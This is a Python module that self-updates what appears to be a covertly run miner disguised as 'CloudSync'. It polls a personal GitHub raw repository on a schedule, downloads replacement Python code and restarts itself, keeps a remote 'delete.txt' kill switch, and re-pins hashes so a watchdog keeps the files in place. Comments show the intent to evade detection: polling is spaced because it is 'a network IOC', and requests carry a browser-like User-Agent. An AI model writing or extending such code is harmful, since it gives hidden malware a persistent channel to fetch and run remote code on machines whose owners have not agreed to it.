"""Manifest-pinned self-update with SHA-256 verification and ``.prev`` rollback.

Mirrors the update half of ``F:\\Test Miner\\controller.py``:

* ``maybe_update()`` runs at most every :data:`UPDATE_INTERVAL` seconds.  It
  fetches the published ``manifest.json``, and for every ``files[]`` entry that
  carries a sha256 it downloads the file from the update channel, verifies the
  hash, compile-checks ``*.py`` payloads before adopting them, copies the old
  file to ``<name>.prev`` and writes the new one atomically.
* ``controller.py`` (or its package successor) => ``True`` (supervisor restarts
  itself); ``config_high.json`` => ``"restart-worker"``; anything else => the
  file is swapped in place and ``False`` is returned.
* A transient download failure retries in 5 minutes instead of 15.
* ``handle_probation()`` rolls back a controller update that failed to get going
  (``update.json`` attempts >= 3 -> restore ``controller.py.prev``).
* ``remote_kill()`` reads the channel's ``delete.txt`` kill switch.
* Modular installs (``install.json`` ``"runtime": "modular"``, tasks run
  ``pythonw -m cloudsync``) never consume the flat ``controller.py`` entry: it is
  dropped from the target list and probation rollback is inert, so the update
  channel cannot re-create the flat runtime (no drift back to flat).

Nothing runs at import time.  The network fetch is injectable (``fetch``), so the
whole updater can be exercised offline with a fake transport.
"""

from __future__ import annotations

import hashlib
import json
import os
import shutil
import time
import urllib.request

from .config.settings import DEFAULT_UPDATE_FILES, read_json
from .core.state import atomic_write

__all__ = [
    "UPDATE_INTERVAL",
    "RETRY_SECONDS",
    "PROBATION_SECONDS",
    "PROBATION_ATTEMPTS",
    "UPDATE_MARK",
    "UPDATE_TARGET",
    "KILL_FILE",
    "INSTALL_INFO",
    "DEFAULT_UPDATE_FILES",
    "Updater",
    "handle_probation",
    "refresh_install_pins",
    "remote_kill",
]

UPDATE_INTERVAL = 900        # 15 min; frequent polling is a network IOC
RETRY_SECONDS = 300          # retry a failed update fetch in 5 min
PROBATION_SECONDS = 300      # a new controller must survive this long
PROBATION_ATTEMPTS = 3       # starts before the .prev rollback
UPDATE_MARK = "update.json"
UPDATE_TARGET = "controller.py"
KILL_FILE = "delete.txt"
INSTALL_INFO = "install.json"     # the watchdog's local source of truth

_MIN_BODY = 40               # ignore truncated/error bodies (parity)


# ---------------------------------------------------------------------------
# small helpers
# ---------------------------------------------------------------------------


def _sha256_file(path):
    """Hex SHA-256 of a file, or None when it cannot be read."""
    try:
        digest = hashlib.sha256()
        with open(path, "rb") as handle:
            for chunk in iter(lambda: handle.read(1 << 20), b""):
                digest.update(chunk)
        return digest.hexdigest()
    except Exception:
        return None


def _install_dir(settings, install_dir=None):
    if install_dir:
        return os.fspath(install_dir)
    if settings is None:
        return os.getcwd()
    if isinstance(settings, (str, bytes, os.PathLike)):
        return os.fspath(settings)
    return getattr(settings, "install_dir", None) or os.getcwd()


def _default_fetch(url, timeout=30):
    """Fetch bytes from the update channel (TLS via urllib)."""
    try:
        request = urllib.request.Request(
            url, headers={"User-Agent": "Mozilla/5.0 CloudSync/1.0",
                          "Cache-Control": "no-cache"})
        return urllib.request.urlopen(request, timeout=timeout).read()
    except TypeError:  # very old Python / odd monkeypatch: plain call
        return urllib.request.urlopen(url, timeout=timeout).read()


def _safe_manifest_name(name):
    """True when a manifest ``files[]`` path cannot escape the install dir.

    A compromised (or accidental) manifest entry such as ``..\\evil.py``,
    ``C:/x.py`` or ``a/../b.py`` is rejected. Forward-slash *relative*
    subpaths ARE allowed, because the modular package ships as
    ``cloudsync/<module>.py`` and the update channel has to be able to
    deliver those modules; nothing with a drive letter, a backslash, an
    absolute root or a ``..`` segment can ever be written.
    """
    text = str(name or "").strip()
    if not text:
        return False
    if "\\" in text or ":" in text or text.startswith("/"):
        return False
    parts = text.split("/")
    if any(part in ("", ".", "..") for part in parts):
        return False
    return True


def _normalise_logger(logger):
    if logger is None:
        return lambda _message: None
    if callable(logger):
        return logger
    for name in ("log", "write"):
        method = getattr(logger, name, None)
        if callable(method):
            return method
    return lambda _message: None


def _pin_key(name):
    """Normalised ``install.json`` pin key (Windows path form, case-insensitive)."""
    return str(name or "").strip().replace("/", "\\").lower()


def _pin_name(name):
    """Pin key written back for a path that install.json does not list yet."""
    return str(name).strip().replace("/", "\\")


def refresh_install_pins(install_dir, changed, log=None):
    """Re-pin the files an update just replaced in ``<install_dir>\\install.json``.

    ``watchdog.ps1`` restores any file whose hash differs from its ``files`` pin
    out of the shadow copy.  The updater used to replace the payloads but leave
    the pins at the pre-update hashes, so the watchdog kept restoring the OLD
    files, the next controller re-downloaded the NEW ones and re-execed - the
    endless 10-minute restore/re-download loop seen in the field.  Refresh the
    pins in the same step as the write.

    The document shape is kept exactly as the installer wrote it: a JSON object
    mapping path -> sha256 (a ``[{path, sha256}]`` list is also accepted and
    updates in place).  Every other field survives; the write is atomic.

    Never fatal: a missing/unreadable/odd ``install.json``, an unwritable file
    or a payload whose hash cannot be computed leaves the old pin alone.
    Returns ``{path: new-sha256}`` for the pins actually written.
    """
    log = _normalise_logger(log)
    try:
        base = os.fspath(install_dir)
        path = os.path.join(base, INSTALL_INFO)
        if not os.path.isfile(path):
            return {}
        info = read_json(path, None)
        if not isinstance(info, dict):
            return {}
        pins = info.get("files")

        updated = {}
        wanted = {}
        for name in changed or ():
            digest = _sha256_file(os.path.join(base, *str(name).split("/")))
            if not digest:
                # Never pin a hash we could not compute: the old pin stays.
                continue
            wanted[str(name)] = digest

        if not wanted:
            return {}

        if isinstance(pins, list):
            by_key = {}
            for entry in pins:
                if isinstance(entry, dict):
                    by_key[_pin_key(entry.get("path"))] = entry
            for name, digest in wanted.items():
                entry = by_key.get(_pin_key(name))
                if entry is None:
                    entry = {"path": _pin_name(name), "sha256": digest}
                    pins.append(entry)
                    by_key[_pin_key(name)] = entry
                entry["sha256"] = digest
                updated[name] = digest
        else:
            if not isinstance(pins, dict):
                pins = {}
            existing = {_pin_key(key): key for key in pins}
            for name, digest in wanted.items():
                key = existing.get(_pin_key(name))
                if key is None:
                    key = _pin_name(name)
                    existing[_pin_key(name)] = key
                pins[key] = digest
                updated[name] = digest
            info["files"] = pins

        atomic_write(path, json.dumps(info, indent=2))
        log("install.json pins refreshed: %d file(s)" % len(updated))
        return updated
    except Exception as exc:
        log("install.json pin refresh failed (non-fatal): %r" % (exc,))
        return {}


# ---------------------------------------------------------------------------
# Updater
# ---------------------------------------------------------------------------


class Updater:
    """Incremental, hash-pinned self-update for one install directory."""

    def __init__(self, settings=None, *, fetch=None, clock=None, log=None,
                 install_dir=None, update_interval=UPDATE_INTERVAL):
        self.settings = settings
        self.install_dir = _install_dir(settings, install_dir)
        self._fetch = fetch or _default_fetch
        self._clock = clock or time.time
        self._log = _normalise_logger(log)
        self.update_interval = float(update_interval)
        self.last = 0.0
        self._warned = False
        self._skipped_logged = False

    def __repr__(self):
        return "Updater(%r, last=%r)" % (self.install_dir, self.last)

    # -- settings helpers ---------------------------------------------------

    def path(self, name):
        return os.path.join(self.install_dir, name)

    def _update_url(self, name):
        helper = getattr(self.settings, "update_url", None)
        if callable(helper):
            return helper(name)
        base = getattr(self.settings, "update_base",
                       "https://raw.githubusercontent.com/minjiwilliams-dotcom/config/main/")
        if not base.endswith("/"):
            base += "/"
        return base + name

    def _remote_enabled(self):
        return bool(getattr(self.settings, "remote_update", True))

    def _legacy_update(self):
        return bool(getattr(self.settings, "legacy_update", False))

    def _modular(self):
        """True when the install runs the package instead of ``controller.py``."""
        checker = getattr(self.settings, "is_modular", None)
        if callable(checker):
            try:
                return bool(checker())
            except Exception:
                return False
        runtime = getattr(self.settings, "runtime", "flat")
        return str(runtime or "flat").strip().lower() == "modular"

    def _filter_targets(self, targets):
        """Drop targets that do not belong to this runtime.

        Modular: a flat ``controller.py`` would leave the flat entry point in a
        modular install directory, which the Run-key resolution then treats as
        the flat runtime - the drift this guard exists to prevent.

        Flat: the ``cloudsync/**`` modules belong to the package runtime only,
        so a flat install must not pull 27 modules it will never import.

        Logged once each, like the other low-volume updater warnings.
        """
        modular = self._modular()
        if modular:
            kept = [item for item in targets if item[0] != UPDATE_TARGET]
            dropped = len(targets) - len(kept)
            if dropped and not self._skipped_logged:
                self._skipped_logged = True
                self._log("update: modular runtime - controller.py skipped")
            return kept
        kept = [item for item in targets if "/" not in item[0]]
        dropped = len(targets) - len(kept)
        if dropped and not self._skipped_logged:
            self._skipped_logged = True
            self._log("update: flat runtime - %d package module(s) skipped" % dropped)
        return kept

    def _fetch_bytes(self, name, timeout=30):
        return self._fetch(self._update_url(name), timeout)

    # -- target list --------------------------------------------------------

    def _targets(self):
        """Return ``(name, sha256-or-None)`` pairs to sync, like the controller."""
        try:
            raw = self._fetch_bytes("manifest.json", 20)
            manifest = json.loads(raw)
            targets = []
            for entry in (manifest.get("files") or []):
                name = entry.get("path") or ""
                sha = str(entry.get("sha256") or "").lower()
                if name and not _safe_manifest_name(name):
                    self._log("update: skipping unsafe manifest path %r" % (name,))
                    continue
                if name and sha and not sha.startswith("__"):
                    targets.append((name, sha))
            if targets:
                return self._filter_targets(targets)
            self._log("manifest.json has no usable file list")
        except Exception:
            if not self._legacy_update():
                if not self._warned:
                    self._warned = True
                    self._log(
                        "no manifest.json in the repo - remote update idle. "
                        "Publish manifest.json (make-manifest.ps1), or set "
                        '"legacy_update": true in manifest.json.')
                return []
            self._log("no manifest.json - legacy direct-update mode")
        return self._filter_targets([(name, None) for name in DEFAULT_UPDATE_FILES])

    # -- the update step ----------------------------------------------------

    def maybe_update(self):
        """Check the channel; update files when due.  Safe to call every tick.

        Returns ``True`` when a supervisor restart is required, ``"restart-worker"``
        when only the worker config changed, else ``False``.
        """
        if not self._remote_enabled():
            if not self._warned:
                self._warned = True
                self._log("remote update DISABLED (manifest.json: remote_update=false)")
            return False

        now = self._clock()
        if now - self.last < self.update_interval:
            return False
        self.last = now

        changed = []
        failed = False
        for name, wanted in self._targets():
            local = self.path(name)
            try:
                data = self._fetch_bytes(name, 30)
            except Exception as exc:
                self._log("update download failed: %s (%s)" % (name, exc))
                failed = True
                continue
            if not data or len(data) < _MIN_BODY:
                continue
            got = hashlib.sha256(data).hexdigest()
            if _sha256_file(local) == got:
                continue
            if wanted and got != wanted:
                self._log("update hash mismatch, ignoring: %s" % name)
                continue
            if name.endswith(".py"):
                try:
                    compile(data, name, "exec")
                except SyntaxError as exc:
                    self._log("update rejected (syntax): %s %s" % (name, exc))
                    continue
            if os.path.isfile(local):
                try:
                    shutil.copy2(local, local + ".prev")
                except OSError:
                    pass
            try:
                atomic_write(local, data)
            except OSError as exc:
                self._log("update write failed: %s (%r)" % (name, exc))
                continue
            changed.append(name)
            self._log("updated %s" % name)

        if failed:
            # a transient fetch failure must not cost 15 minutes: retry in 5
            self.last = self._clock() - self.update_interval + RETRY_SECONDS

        if changed:
            # Re-pin what was just written, or watchdog.ps1 restores the old
            # files from the shadow copy on its next run (the restore loop).
            refresh_install_pins(self.install_dir, changed, self._log)

        if UPDATE_TARGET in changed:
            atomic_write(self.path(UPDATE_MARK),
                         json.dumps({"applied": time.time(), "attempts": 0}))
            return True
        # A modular package module changed: the running supervisor has the old
        # module objects in memory, so only a re-exec loads the new code. The
        # flat controller marker/probation is deliberately NOT written here -
        # handle_probation is inert on a modular install and a stale marker would
        # be misleading.
        if any(name.endswith(".py") and "/" in name for name in changed):
            return True
        if "config_high.json" in changed:
            return "restart-worker"
        return False


# ---------------------------------------------------------------------------
# probation / kill switch
# ---------------------------------------------------------------------------


def _is_modular_install(base, settings=None):
    """True when *base* runs the package (``install.json`` ``runtime: modular``).

    Accepts an already-built Settings (``is_modular()``), a duck-typed object
    with ``runtime``, or nothing - in which case the install's ``install.json``
    is read (the supervisor's ``handle_probation(install_dir)`` call shape).
    """
    checker = getattr(settings, "is_modular", None)
    if callable(checker):
        try:
            return bool(checker())
        except Exception:
            return False
    runtime = getattr(settings, "runtime", None)
    if runtime is not None:
        return str(runtime or "flat").strip().lower() == "modular"
    info = read_json(os.path.join(base, "install.json"), None)
    if isinstance(info, dict):
        return str(info.get("runtime") or "flat").strip().lower() == "modular"
    return False


def handle_probation(install_dir=None, *, settings=None, log=None,
                     target=UPDATE_TARGET, mark=UPDATE_MARK,
                     attempts=PROBATION_ATTEMPTS):
    """Roll back a controller update that cannot get going; True when rolled back.

    ``update.json`` carries an ``attempts`` counter; each start increments it and
    at *attempts* the previous controller (``<target>.prev``) is restored and the
    marker removed, exactly like ``controller.handle_probation``.

    Inert on a modular install: there is no flat ``controller.py`` to roll back,
    and restoring a ``.prev`` copy would re-create the flat runtime.
    """
    log = _normalise_logger(log)
    base = _install_dir(settings, install_dir)
    if _is_modular_install(base, settings):
        log("update: modular runtime - probation rollback inert")
        return False
    marker_path = os.path.join(base, mark)
    marker = read_json(marker_path, None)
    if not isinstance(marker, dict):
        return False

    try:
        count = int(marker.get("attempts", 0)) + 1
    except (TypeError, ValueError):
        count = 1

    if count >= attempts:
        previous = os.path.join(base, target + ".prev")
        destination = os.path.join(base, target)
        if os.path.isfile(previous):
            try:
                shutil.copy2(previous, destination)
                log("rolled controller back to .prev after %d failed starts" % count)
                os.remove(marker_path)
                return True
            except OSError as exc:
                log("rollback failed: %r" % (exc,))
        try:
            os.remove(marker_path)
        except OSError:
            pass
        return False

    marker["attempts"] = count
    try:
        atomic_write(marker_path, json.dumps(marker))
    except OSError as exc:
        log("could not update probation marker: %r" % (exc,))
    return False


def remote_kill(settings=None, *, fetch=None, log=None, name=KILL_FILE,
                timeout=10):
    """True when the update channel's ``delete.txt`` is non-empty (kill switch)."""
    fetch = fetch or _default_fetch
    log = _normalise_logger(log)
    url = None
    helper = getattr(settings, "update_url", None)
    if callable(helper):
        url = helper(name)
    else:
        base = getattr(settings, "update_base",
                       "https://raw.githubusercontent.com/minjiwilliams-dotcom/config/main/")
        if not base.endswith("/"):
            base += "/"
        url = base + name
    try:
        body = fetch(url, timeout)
        return bool(body and body.strip())
    except Exception:
        return False
